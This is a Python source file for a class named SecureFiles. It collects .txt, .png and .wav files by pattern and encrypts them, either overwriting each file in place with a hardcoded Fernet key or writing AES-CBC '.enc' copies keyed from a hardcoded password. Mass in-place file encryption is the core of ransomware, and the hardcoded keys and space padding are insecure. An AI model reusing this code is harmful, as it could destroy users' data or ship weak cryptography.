from cryptography.fernet import Fernet
from Cryptodome.Cipher import AES
import os, struct,hashlib
from components.fileManipulation import FileManipulation


class SecureFiles:
    def __init__(self):
        self.password = 'lion123lion123lion123lion123lion123lion123lion123lion123'.encode('utf-8')
        self.key = hashlib.sha256(self.password).digest()
        file_manipulation = FileManipulation("cap_li",["*.txt","*.png","*.wav"]) 
        self.files_to_encrypt = file_manipulation.cap_file_list()       
        print(self.files_to_encrypt)

    def fernet_encrypt(self):
        for encrypting_file in self.files_to_encrypt:
            with open(encrypting_file, 'rb') as f:
                data = f.read()
            fernet = Fernet('SHkF3WZhWKRD3D14HmCgTVMokkNJX7wWMq-NYyRuhd8=')
            encrypted_data = fernet.encrypt(data)

            with open(encrypting_file, "wb") as f:
                f.write(encrypted_data)

    def encrypt_file(self):
        for in_filename in self.files_to_encrypt:
            out_filename=None
            chunksize=64*1024
            if not out_filename:
                out_filename = in_filename + '.enc'

            iv = os.urandom(16)
            encryptor = AES.new(self.key, AES.MODE_CBC,iv )
            filesize = os.path.getsize(in_filename)

            with open(in_filename, 'rb') as infile:
                with open(out_filename, 'wb') as outfile:
                    outfile.write(struct.pack('<Q', filesize))
                    outfile.write(iv)
                    while True:
                        chunk = infile.read(chunksize)
                        if len(chunk) == 0:
                            break
                        elif len(chunk) % 16 != 0:
                            chunk += ' '.encode() * (16 - len(chunk) % 16)
                        outfile.write(encryptor.encrypt(chunk))
        